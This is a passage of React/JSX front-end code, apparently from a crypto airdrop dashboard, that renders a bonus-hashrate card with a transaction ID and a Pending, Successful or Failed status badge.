                                <div className='bg-white dark:bg-isoDark dark:text-white text-black rounded-lg p-5 space-y-4'>
                                  <div className='flex items-center space-x-2 font-semibold'>
                                    <div className='text-white rounded-full p-1 dark:bg-isoColor2 dark:text-black bg-isoColor1'><IoGiftOutline className={`h-3 w-3`} /></div>
                                    <p>Bonus Hashrate</p>
                                    <p>+20 MH/s</p>
                                  </div>

                                  <p className='text-xs text-neutral-500'>ID: {block.transactionID}</p>

                                  <div className='flex items-center space-x-1'>
                                    {
                                      block.status === "Pending" ? (
                                      <div className='text-black rounded-md py-1 px-3 w-fit bg-yellow-500'>Pending</div>
                                    ) : block.status === "Successful" ? (
                                      <a href="/dashboard/wallets" className='text-white dark:text-isoColor2 dark:bg-isoDark2 rounded-md py-1 px-3 w-fit bg-isoColor1'>Transfer to wallet</a>
                                    ) : (
                                      <div className='text-white rounded-md py-1 px-3 w-fit bg-red-500'>Failed</div>
                                    )
                                  }
                                  </div>
                                </div>
                              </div>
                            ))}

                          </div>
                      </div>
                  )
                }
              </div>
    
            </div>
    
            {
              screen === 1 && (<Footer tab={`airdrop`} />)
            }
        </div>
      )
}